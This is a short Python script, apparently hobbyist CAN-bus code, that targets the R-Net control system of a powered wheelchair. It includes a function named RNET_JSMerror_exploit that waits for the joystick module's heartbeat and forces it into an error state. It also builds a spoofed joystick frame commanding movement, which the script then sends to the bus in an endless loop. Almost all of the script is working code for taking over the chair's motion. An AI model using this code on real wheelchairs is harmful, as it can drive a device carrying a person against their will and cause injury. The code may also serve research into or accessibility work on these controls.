# import os
# import can
# bus = can.interface.Bus(channel='can0', bustype='socketcan_native')
# msg = can.Message(arbitration_id=0x7de,data=[0, 25, 0, 1, 3, 1, 4, 1])
# bus.send(msg)

import socket, sys, os, array, threading
from time import *
from fcntl import ioctl
from can2RNET import *



joystick_x = 100
joystick_y = 0

def RNET_JSMerror_exploit(cansocket):
    print("Waiting for JSM heartbeat")
    canwait(cansocket,"03C30F0F:1FFFFFFF")
    t=time()+0.20

    print("Waiting for joy frame")
    joy_id = wait_rnet_joystick_frame(cansocket,t)
    print("Using joy frame: "+joy_id)

    induce_JSM_error(cansocket)
    print("3 x 0c000000# sent")

    return(joy_id)

def dec2hex(dec,hexlen):  #convert dec to hex with leading 0s and no '0x'
    h=hex(int(dec))[2:]
    l=len(h)
    if h[l-1]=="L":
        l-=1  #strip the 'L' that python int sticks on
    if h[l-2]=="x":
        h= '0'+hex(int(dec))[1:]
    return ('0'*hexlen+h)[l:l+hexlen]

joyframe = '02000200'+'#'+dec2hex(joystick_x,2)+dec2hex(joystick_y,2)
print(joyframe)

# cansend(s,joyframe)
can_socket = opencansocket(0)

def RNETshortBeep(cansocket):
    cansend(cansocket,"181c0100#0260000000000000")

def RNETplaysong(can_socket):
    cansend(can_socket,"181C0100#2056080010560858")
    sleep(.77)
    cansend(can_socket,"181C0100#105a205b00000000")

# RNETplaysong(can_socket)

while True:
    cansend(can_socket, joyframe)
